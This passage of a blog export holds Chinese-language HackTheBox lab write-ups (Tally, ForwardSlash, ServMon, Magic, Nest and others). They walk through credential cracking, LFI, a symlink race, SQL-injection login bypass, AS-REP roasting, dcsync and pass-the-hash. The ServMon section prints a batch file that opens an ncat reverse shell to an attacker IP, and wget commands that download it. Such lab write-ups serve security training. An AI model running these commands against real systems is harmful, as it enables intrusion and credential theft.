Serviceshttps://www.mssqltips.com/sqlservertip/1657/get-active-directory-users-and-groups-with-sql-server-integration-services/ User Attributes - Inside Active Directoryhttp://www.kouti.com/tables/userattributes.htm phra’s blog ~ Technical posts about InfoSechttps://iwantmore.pizza/posts/cve-2019-1414.html Debugging - Getting Started | Node.jshttps://nodejs.org/en/docs/guides/debugging-getting-started/ https://github.com/taviso/cefdebug/releases Multimaster 10.10.10.179 Прохождение | M0NET - YouTubehttps://www.youtube.com/watch?v=go_DosCmBDU&amp;list=WL&amp;index=2&amp;t=0s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Tally - HackTheBox","slug":"Tally-HackTheBox","date":"2020-05-01T07:09:07.000Z","updated":"2021-08-25T07:10:36.138Z","comments":true,"path":"2020/05/01/Tally-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/05/01/Tally-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/113 10.10.10.59 端口扫描常规windows端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$ nmap -sC -sV 10.10.10.59Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-25 14:09 CSTNmap scan report for 10.10.10.59Host is up (0.065s latency).Not shown: 992 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-syst:|_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 10.0| http-ntlm-info:| Target_Name: TALLY| NetBIOS_Domain_Name: TALLY| NetBIOS_Computer_Name: TALLY| DNS_Domain_Name: TALLY| DNS_Computer_Name: TALLY|_ Product_Version: 10.0.14393| http-title: Home|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx|_http-server-header: Microsoft-IIS/10.0|_http-generator: Microsoft SharePoint81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Bad Request|_http-server-header: Microsoft-HTTPAPI/2.0135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds808/tcp open ccproxy-http?1433/tcp open ms-sql-s Microsoft SQL Server 2016 13.00.1601.00; RTM| ms-sql-ntlm-info:| Target_Name: TALLY| NetBIOS_Domain_Name: TALLY| NetBIOS_Computer_Name: TALLY| DNS_Domain_Name: TALLY| DNS_Computer_Name: TALLY|_ Product_Version: 10.0.14393| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2021-08-25T06:07:42|_Not valid after: 2051-08-25T06:07:42|_ssl-date: 2021-08-25T06:10:08+00:00; 0s from scanner time.Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode:| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required| smb2-time:| date: 2021-08-25T06:09:55|_ start_date: 2021-08-25T06:07:24| ms-sql-info:| 10.10.10.59:1433:| Version:| name: Microsoft SQL Server 2016 RTM| number: 13.00.1601.00| Product: Microsoft SQL Server 2016| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 56.55 seconds 80Sharepoint: sharepoint常规目录查看文件，发现一个文档，其中是FTP密码： http://10.10.10.59/_layouts/15/viewlsts.aspx 另外切换到mobile模式，查看站点内容，可以发现一个财务团队页面，其中得到ftp用户名： ftp-details12345FTP detailshostname: tallyworkgroup: htb.localpassword: UTDRSCH53c&quot;$6hysPlease create your own user folder upon logging in FTP登录FTP，可以得到一个keepass数据库文件： /User/Tim/Files/tim.kdbx，并且另一个文本也提示里面有密码 keepass破解出来kepass 主密码： 12345keepass2john tim.kdbxtim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7dasudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtsimplementeyo (tim) 其中可以得到财务的共享密码： 1Finance:Acc0unting do to.txt/User/Tim/Project/Log/do to.txt 12345678To do:Remove migration folderSet secure share permissionsencrypted share creds:password in keepass% SMB得到的财务账号密码可以访问SMB： /zz_Migration/Binaries/New folder/tester.exe中得到数据库连接信息： 1DRIVER&#x3D;&#123;SQL Server&#125;;SERVER&#x3D;TALLY, 1433;DATABASE&#x3D;orcharddb;UID&#x3D;sa;PWD&#x3D;GWE3V65#6KFH93@4GWTG2G; MSSQL &amp; user flagmssql sa，常规getshell，得到Sarah用户shell,桌面得到user.txt: 提权信息查看权限可以看到SeImpersonatePrivilege： 提权 &amp; root flag直接potato提权，Administrator桌面得到root.txt: 参考资料 https://www.hackthebox.eu/home/machines/writeup/113 Tally write-up - The Portal of Knowledgehttps://alamot.github.io/tally_writeup/ HackTheBox - Tally - YouTubehttps://www.youtube.com/watch?v=l-wzBhc9wFc&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"ForwardSlash - HackTheBox","slug":"ForwardSlash-HackTheBox","date":"2020-04-29T05:36:18.000Z","updated":"2020-07-06T05:45:10.218Z","comments":true,"path":"2020/04/29/ForwardSlash-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/29/ForwardSlash-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/239 10.10.10.183 端口扫描常规22和80: 80需要加一下host： 110.10.10.183 forwardslash.htb 扫一下目录： 1gobuster dir -u http://forwardslash.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt 发现一个note.txt: 1234Pain, we were hacked by some skids that call themselves the &quot;Backslash Gang&quot;... I know... That name... Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.-chiv backup site根据提示信息以及vhost扫描，找到backup.forwardslash.htb，同样加到hosts里： 1gobuster vhost -u http://forwardslash.htb/ -w /usr/share/wordlists/dirb/common.txt 注册账号登录进去，这个功能有个可疑的地方： 取消disable测试，发现是post一个url参数： LFI 这里有一个明显的LFI： /etc/passwd 根据passwd文件得到两个用户名： 12pain:x:1000:1000:pain:&#x2F;home&#x2F;pain:&#x2F;bin&#x2F;bashchiv:x:1001:1001:Chivato,,,:&#x2F;home&#x2F;chiv:&#x2F;bin&#x2F;bash config.php直接读取config.php得到数据库配置信息： 123define('DB_USERNAME', 'www-data');define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');define('DB_NAME', 'site'); api.php部分文件直接读没权限可以用php伪协议： dev/index.php得到chiv账号密码： 1chiv ： N0bodyL1kesBack&#x2F; chiv ssh用这个账号密码能ssh登录chiv，但user.txt在另一个用户目录里： backup 条件竞争 存在/var/backups目录和/usr/bin/backup程序, 直接使用报错： 根据报错信息，可以利用条件竞争： 123cat shell.shi=$(backup | grep ERROR | awk '&#123;print $2&#125;');ln -s /var/backups/config.php.bak /home/chiv/$i;/usr/bin/backup; 得到pain用户密码： 123define(&#39;DB_USERNAME&#39;, &#39;pain&#39;);define(&#39;DB_PASSWORD&#39;, &#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&#39;);define(&#39;DB_NAME&#39;, &#39;site&#39;); user flag切换到pain用户，得到user.txt: encryptorinator在这个目录有一个加密文本和加解密代码： 根据代码写一个解密程序爆破key，获得message： 12345678910111213141516171819202122def decrypt(key, msg): key = list(key) msg = list(msg) for char_key in reversed(key): for i in reversed(range(len(msg))): if i == 0: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1])) else: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1])) while tmp &lt; 0: tmp += 256 msg[i] = chr(tmp) return ''.join(msg) ciphertext = open('ciphertext', 'r').read().rstrip()for i in range(1, 165): for j in range(33, 127): key = chr(j) * i msg = decrypt(key, ciphertext) if 'the ' in msg or 'be ' in msg or 'and ' in msg or 'of ' in msg : exit(\"Key: &#123;0&#125;, Key length: &#123;1&#125;, Msg: &#123;2&#125;\".format(key, len(key), msg)) 结果： 12python miao.pyKey: ttttttttttttttttt, Key length: 17, Msg: Hl�vF��;�������&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf 信息根据结果得到这个加密的img： 1&#x2F;var&#x2F;backups&#x2F;recovery&#x2F;encrypted_backup.img 并且sudo -l能够看到当前用户可以无密码cryptsetup以及指定目录mount： pain用户目录也有个note.txt说明这些： 1234cat note.txtPain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.-chiv decrypt &amp; mount12345sudo &#x2F;sbin&#x2F;cryptsetup luksOpen &#x2F;var&#x2F;backups&#x2F;recovery&#x2F;encrypted_backup.img backupmkdir mntsudo &#x2F;bin&#x2F;mount &#x2F;dev&#x2F;mapper&#x2F;backup .&#x2F;mnt&#x2F;cd mnt&#x2F;ls 里面是一个SSH私钥： root flag使用这个私钥可以ssh登录root，得到root.txt: 参考资料 https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html Hackthebox Forwardslash Walkthrough - YouTubehttps://www.youtube.com/watch?v=hSGOLMgr5bw","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"ServMon - HackTheBox","slug":"ServMon-HackTheBox","date":"2020-04-27T09:08:22.000Z","updated":"2020-06-22T07:24:39.594Z","comments":true,"path":"2020/04/27/ServMon-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/27/ServMon-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/240 10.10.10.184 端口扫描 2121端口FTP可以匿名连接： 两个用户目录中两个txt： 8080是NVMS 1000 直接搜索有一个相关漏洞： 1auxiliary&#x2F;scanner&#x2F;http&#x2F;tvt_nvms_traversal 2019-12-12 normal No TVT NVMS-1000 Directory Traversal 根据前面的信息 Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine% 我们读取Nathan桌面的passwords.txt 12345678910set filepath &#x2F;users&#x2F;Nathan&#x2F;Desktop&#x2F;Passwords.txtresult:1nsp3ctTh3Way2Mars!Th3r34r3To0M4nyTrait0r5!B3WithM30r4ga1n5tMeL1k3B1gBut7s@W0rk0nly7h3y0unGWi11F0l10wIfH3s4b0Utg0t0H1sH0meGr4etN3w5w17hMySk1Pa5$ 84438443是NSClient++ 根据前面txt中的提示 Lock down the NSClient Access - Complete 这个远程访问不能进行操作 smb login跟就上面的用户名和密码字典，进行smb爆破，得到一组正确账号密码： 1nadine:L1k3B1gBut7s@W0rk user flag注意前面还有个22端口，windows机器开了openssh，用这个账号密码登录就能得到user.txt: nsclient++ exploit 8443端口是nsclient，搜索发现： https://www.exploit-db.com/exploits/46802 配置文件查看配置文件获取密码，并且发现allow设置为127.0.0.1: 1password &#x3D; ew2x6SsGTxjRwXOT SSH端口转发因为上面的配置只allow 127.0.0.1, 需要做一下端口转发才能正常操作： 1ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443 注意需要转发两次，第一次登录ssh，第二次在ssh session中再转发一次，之后我们就可以直接访问本机的8443端口，相当于在target上通过127.0.0.1访问： 上传利用文件1234567$ cat evil.bat@echo offc:\\temp\\ncat.exe 10.10.14.44 7777 -e cmd.exetarget powershell：wget 10.10.14.44:6666&#x2F;evil.bat -o evil.batwget 10.10.14.44:6666&#x2F;ncat.exe -o ncat.exe exploit利用基本就这个步骤： https://www.exploit-db.com/exploits/46802 因为端口转发，非常慢 root flag坐和放宽，等reverse shell，得到root.txt: 参考资料 https://www.exploit-db.com/exploits/46802 Hackthebox Servmon (user) Walkthrough - YouTubehttps://www.youtube.com/watch?v=PrtO1Lo4g6I","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Magic - HackTheBox","slug":"Magic-HackTheBox","date":"2020-04-26T06:24:30.000Z","updated":"2020-08-24T02:28:15.171Z","comments":true,"path":"2020/04/26/Magic-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/26/Magic-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/241 10.10.10.185 端口扫描常规的Linux，22和80: 80 看起来是个图床，有登录界面,很简单的注入，直接万能密码就可以： 1&#39;or&#39;1&#39;&#x3D;&#39;1 bypass_image_upload只能上传图像，并且存在文件头校验，那就做一个图片马上传： 直接加载个meterpreter： config文件在db.php5中发现一组账号密码： 1theseus ： iamkingtheseus 但这个账号只能公钥登录ssh，直接在已有shell里su提示su: must be run from a terminal pty spawnsu问题搜到解决方法 https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292 但使用上面的密码失败： mysqldump根据上面的数据库信息dump： 1mysqldump -utheseus -piamkingtheseus Magic 得到另一组账号密码： 1admin ： Th3s3usW4sK1ng user flag使用这个密码切换用户，得到user.txt: 为了方便我们可以把自己的ssh公钥加到靶机authorized_keys，然后直接通过ssh登录 提权信息注意到sysinfo具有suid： 1find / -perm -u=s -type f 2&gt;/dev/null 那么我们考虑自己创建一个sysinfo会调用的程序例如lshw，并且修改环境变量提高它的优先级： root flag这样当执行sysinfo调用lshw时，执行的是我们的reverse shell代码，得到root.txt: root目录有个info.c,里面也可以看到调用了lshw： 参考资料 https://github.com/xapax/security/blob/master/bypass_image_upload.md http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292 Hackthebox Magic Walkthrough - YouTubehttps://www.youtube.com/watch?v=TgczBJmcaZ0","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Nest - HackTheBox","slug":"Nest-HackTheBox","date":"2020-04-24T07:00:17.000Z","updated":"2020-06-08T01:52:14.120Z","comments":true,"path":"2020/04/24/Nest-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/24/Nest-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/225 10.10.10.178 端口扫描windows服务器，两个端口，没有web： 445enum4linux没什么结果，smb能直接匿名连接： 发现两个txt文件： 下载下来查看内容，得到一组账号密码： 12Username: TempUserPassword: welcome2019 TempUser使用TempUser登录，查看信息, 下载文件： config能够发现两个config文件： 12IT&#x2F;Configs&#x2F;NotepadPlusPlus&#x2F;config.xmlIT&#x2F;Configs&#x2F;RU Scanner&#x2F;RU_Config.xml 密码是加密的，还需要进一步的信息去解密 根据config中的history，能够看到Secure$目录相关，我们把这个目录也下载下来 Secure$这里IT目录是没有权限的，只看Carl就可以： 在VB项目目录发现是对前面的RU_config做加解密操作的代码： decrypt代码里加一行输出，自己用VS运行解密操作或者直接用这个在线的： https://dotnetfiddle.net/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384Imports System.TextImports System.Security.CryptographyPublic Class Utils Public Class ConfigFile Public Property Port As Integer Public Property Username As String Public Property Password As String Public Sub SaveToFile(Path As String) Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create) Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile)) Writer.Serialize(File, Me) End Using End Sub Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open) Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile)) Return DirectCast(Reader.Deserialize(File), ConfigFile) End Using End Function End Class Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\", 256) End If End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = System.Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As System.IO.MemoryStream memoryStream = New System.IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) System.Console.WriteLine(plainText) Return plainText End FunctionPublic Class SsoIntegration Public Property Username As String Public Property Password As StringEnd Class Sub Main() Dim test As New SsoIntegration With &#123;.Username = \"c.smith\", .Password = Utils.DecryptString(\"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\")&#125; End SubEnd Class 解出来密码 xRxRxPANCAK3SxRxRx： user flag使用c.smith账号登录，得到user.txt: 提权信息注意到还有个HQK目录，下载下来，两个可能有用的文件： 但需要注意直接下载下来的password大小是0，查看是空，搜索资料发现是AlternateData Streams，config中4386端口就是前面nmap结果中有的, HQK服务： windows - Read alternate data streams over SMB with Linux - Super Userhttps://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux 12345678➜ HQK Reporting cat Debug\\ Mode\\ Password.txt:Password:\\$DATAWBQ201953D8w➜ HQK Reporting cat HQK_Config_Backup.xml&lt;?xml version=\"1.0\"?&gt;&lt;ServiceSettings xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt; &lt;Port&gt;4386&lt;/Port&gt; &lt;QueryDirectory&gt;C:\\Program Files\\HQK\\ALL QUERIES&lt;/QueryDirectory&gt;&lt;/ServiceSettings&gt; HQK123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354telnet 10.10.10.178 4386Trying 10.10.10.178...Connected to 10.10.10.178.Escape character is '^]'.HQK Reporting Service V1.2&gt;helpThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;&gt;DEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available&gt;helpThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;SERVICESESSIONSHOWQUERY &lt;Query_ID&gt;&gt;setdir ..Current directory set to HQK&gt;listUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[DIR] ALL QUERIES[DIR] LDAP[DIR] Logs[1] HqkSvc.exe[2] HqkSvc.InstallState[3] HQK_Config.xmlCurrent Directory: HQK&gt;setdir LDAPCurrent directory set to LDAP&gt;list Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[1] HqkLdap.exe[2] Ldap.confCurrent Directory: LDAP&gt;showquery 2Domain=nest.localPort=389BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=localUser=AdministratorPassword=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= 得到Administrator用户的密码密文 12345Domain&#x3D;nest.localPort&#x3D;389BaseOu&#x3D;OU&#x3D;WBQ Users,OU&#x3D;Production,DC&#x3D;nest,DC&#x3D;localUser&#x3D;AdministratorPassword&#x3D;yyEq0Uvvhq2uQOcWG8peLoeRQehqip&#x2F;fKdeG&#x2F;kjEVb4&#x3D; 反编译 解密同目录还有个exe，这个是解密用的，对其进行反编译, 注意这个文件路径，不需要考虑通过HQK下载文件，前面已经得到了： 反编译工具 https://github.com/0xd4d/dnSpy 这里需要windows机器进行操作,查看代码找到解密的功能后，在return之前插入代码, 输出明文密码。运行时需要同目录下需要有一个名为HqkDbImport.exe 1password ： XtH4nkS4Pl4y1nGX root flag使用这个密码登录Administrator账号，得到root.txt: 参考资料 windows - Read alternate data streams over SMB with Linux - Super Userhttps://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux https://github.com/0xd4d/dnSpy Hackthebox——Nesthttps://mp.weixin.qq.com/s/4UM3HIb9mp1--e7jO8esFQ Hack the Box Walkthrough: Nest | attactics - offensive securityhttps://attactics.org/walkthroughs/hack-the-box-walkthrough-nest/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OpenAdmin - HackTheBox","slug":"OpenAdmin-HackTheBox","date":"2020-04-23T04:40:50.000Z","updated":"2020-05-04T13:11:56.112Z","comments":true,"path":"2020/04/23/OpenAdmin-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/23/OpenAdmin-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/222 10.10.10.171 端口扫描 80 直接访问是默认页面 扫描目录发现存在music目录，login是跳转到ona： ona getshellona默认guest用户登录，版本是 v18.1.1，搜索发现存在已知漏洞,注意这里要用全称搜索： 这个shell是www-root用户，收集信息发现两个用户名和一个密码： 12345678910111213141516171819202122232425$ ls /homejimmyjoanna$ cat local/config/database_settings.inc.php&lt;?php$ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ),); jimmy ssh使用这个密码可以通过ssh登录jimmy,但flag应该是在另一个用户目录中： internal在apache目录看到有个internal，并且查看配置是开在本机的： main.php会将Joanna的私钥输出： 但这个私钥不能直接使用，需要密码： crack passphrase使用john转换后可以破解出密码：bloodninjas user flag使用私钥和对应的密码，登录joanna，得到user.txt: 提权信息直接sudo -l能够看到可以无需密码，sudo执行nano编辑opt下的priv： root flag可以直接使用nano的read file和功能读取/root/root.txt: 参考资料 Hackthebox——OpenAdminhttps://mp.weixin.qq.com/s/-aCfni01RdbFeuExpB7C9A HackTheBox: OpenAdmin Walkthrough 2020 - YouTubehttps://www.youtube.com/watch?v=QdA0bdThJx0&amp;list=PL_ZZRt90Mn-Uo9tejPa39jVofMA0aEHZn&amp;index=4","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Monteverde - HackTheBox","slug":"Monteverde-HackTheBox","date":"2020-04-21T06:39:04.000Z","updated":"2020-06-15T06:39:36.740Z","comments":true,"path":"2020/04/21/Monteverde-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/21/Monteverde-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/223 10.10.10.172 端口扫描windows服务器，没有web： enum4linux 根据结果生成用户名字典： 12345678910GuestAAD_987d7f2f57d2mhopeSABatchJobssvc-atasvc-bexecsvc-netappdgalanosrolearysmorgan smb login使用这个字典爆破smb: 1msf auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login 得到一组账号密码： 1SABatchJobs:SABatchJobs 但这个账号尝试使用evil-winrm登录失败： smbclient直接使用smbclient登录失败,可以访问共享目录： 12smbclient -L 10.10.10.172 -U SABatchJobssmbclient //10.10.10.172/users$ -U SABatchJobs azure.xml在这个目录发现一个azure.xml文件，里面有一个密码： 1mhope : 4n0therD4y@n0th3r$ user flag使用这个账号密码登录，在桌面得到user.txt: 提权信息1whoami /all 可以看到mhope是azure admin： 搜索相关信息，用到的资料和脚本： Azure AD Connect for Red Teamers - XPN InfoSec Bloghttps://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1 Azure-ADConnect执行得到Administrator密码： root flag登录后在桌面得到root.txt: 参考资料 Azure AD Connect for Red Teamers - XPN InfoSec Bloghttps://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1 Hackthebox Monteverde Walkthrough - YouTubehttps://www.youtube.com/watch?v=ma6S5Kk2q9I&amp;t=11s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sauna - HackTheBox","slug":"Sauna-HackTheBox","date":"2020-04-20T07:31:12.000Z","updated":"2020-07-20T00:30:06.400Z","comments":true,"path":"2020/04/20/Sauna-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/20/Sauna-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/229 10.10.10.175 端口扫描 80 389389是ldap，用nmap ldap相关脚本详细扫描： 1nmap -n -sV -script \"ldap*\" -p 389 10.10.10.175 根据结果，域应该是EGOTISTICAL-BANK.LOCAL 用户名字典根据adout信息，生成用户民字典： 123456fsmithhbearskerbscoinsbtaylorsdriver GetNPUserhttps://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py 利用这个和前面的用户名字典，得到一个有效的TGT： 1234python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -outputfile hash.txt -dc-ip 10.10.10.175cat hash.txt$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:23e093d0dbeb39c9f9ca834a989c73e8$6e4bd269f8fe18d739cd032667f1683073a95b544511fb6f4f98df848a973e46a6724be00b8c94511b41aa8622d8a5a5a353fb21090c00d4797950268504f7b6b0957d38406a561a789820dec215a3d9ce3ed8f3cb5707329314fccd14f1380a5bb5298bb1ae85cab124615349b8117e0cc3f617d6f9f6327c0ef073e5b536796fde87567c377d13c8978dd6f2c62dd3424f20e86b58633196332e76656c6866f5127b23c73fc87df1815948d383fbd5c51e5431581f1bd5cc0a80fbee29d2eb51c7c2b6b2ff8f4284f5f5d4616dea2afca926c6e1282dad539b80879c628bb29d936a42e8341be0a100ae109175db32343fac9478717ba76a97bf4025cba13d 根据这个hash可以解出来密码（建议用kali自带的john解）： 1fsmith : Thestrokes23 user flag 使用evil-winrm,用这个账号密码登录，在桌面得到user.txt: 收集提权信息https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe evil-winrm里可以直接上传文件 1upload winPEAS.exe 1234567891011121314[+] Looking for AutoLogon credentials(T1012) Some AutoLogon credentials were found!! DefaultDomainName : EGOTISTICALBANK DefaultUserName : EGOTISTICALBANK\\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! *Evil-WinRM* PS C:\\Users\\FSmith\\desktop&gt; net userUser accounts for \\\\-------------------------------------------------------------------------------Administrator FSmith GuestHSmith krbtgt svc_loanmgrThe command completed with one or more errors. 所以svc_loanmgr的密码应该是Moneymakestheworldgoround!, 但这个账号也不是Administrator权限 dcsync直接通过evil-winrm执行命令加载个meterpreter，然后： 12load kiwidcsync Administrator 我们可以得到Administrator的NTLM Hash PTH get root不需要去破解Hash，可以直接使用PTH进行登录： 123evil-winrm -i 10.10.10.175 -u Administrator -H &#39;d9485863c1e9e05851aa40cbb4ab9dff&#39;# -H, --hash NTHash NTHash 得到root.txt: 参考资料 https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py Kerberos (II): How to attack Kerberos? - Tarlogic Security - Cyber Security and Ethical hackinghttps://www.tarlogic.com/en/blog/how-to-attack-kerberos/ Hackthebox Sauna - YouTubehttps://www.youtube.com/watch?v=Yh4eMNsWoYE&amp;t=14s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mango - HackTheBox","slug":"Mango-HackTheBox","date":"2020-04-17T06:53:16.000Z","updated":"2020-04-23T06:30:00.938Z","comments":true,"path":"2020/04/17/Mango-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/17/Mango-HackTheBox/","excerpt":"","text":"基本信息lab地址： https://www.hackthebox.eu/home/machines/profile/214 10.10.10.162 端口扫描 80 绑定hosts访问后是这个： 443 